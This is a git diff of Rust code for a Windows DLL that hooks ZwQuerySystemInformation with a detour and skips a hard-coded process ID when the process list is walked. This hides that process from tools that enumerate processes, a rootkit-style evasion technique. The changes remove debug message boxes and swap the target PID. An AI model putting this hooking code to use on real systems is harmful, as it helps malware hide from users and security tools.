@@ -2,7 +2,6 @@ use retour::static_detour;
 use std::error::Error;
 use std::os::raw::{c_ulong, c_void};
 use std::{ffi::CString, iter, mem};
-use windows::core::s;
 use windows::core::{PCSTR, PCWSTR};
 use windows::Wdk::System::SystemInformation::{SystemProcessInformation, SYSTEM_INFORMATION_CLASS};
 use windows::Win32::Foundation::{BOOL, HANDLE, NTSTATUS, STATUS_SUCCESS};
@@ -11,9 +10,9 @@ use windows::Win32::System::SystemServices::{
     DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
 };
 use windows::Win32::System::WindowsProgramming::SYSTEM_PROCESS_INFORMATION;
-use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
 
-const HIDE_PID: i32 = 30488;
+// 需要隐藏的进程id
+const HIDE_PID: i32 = 32652;
 
 static_detour! {
     static ZwQuerySystemInformationHook: unsafe extern "system" fn(SYSTEM_INFORMATION_CLASS, *mut c_void, c_ulong, *mut c_ulong) -> NTSTATUS;
@@ -64,8 +63,8 @@ fn zwquery_system_infomation_detour(
         unsafe { mem::transmute(system_infomation) };
     loop {
         if HIDE_PID == unsafe { (*psystem_information).UniqueProcessId.0 } as i32 {
-            let st = unsafe { format!("system information ==> {:#?}", *psystem_information) };
-            unsafe { MessageBoxA(None, PCSTR::from_raw(st.as_ptr()), s!("info"), MB_OK) };
+            // let st = unsafe { format!("system information ==> {:#?}", *psystem_information) };
+            // unsafe { MessageBoxA(None, PCSTR::from_raw(st.as_ptr()), s!("info"), MB_OK) };
             if prev == 0 {
                 system_infomation = (psystem_information as u64
                     + (unsafe { *psystem_information }).NextEntryOffset as u64)
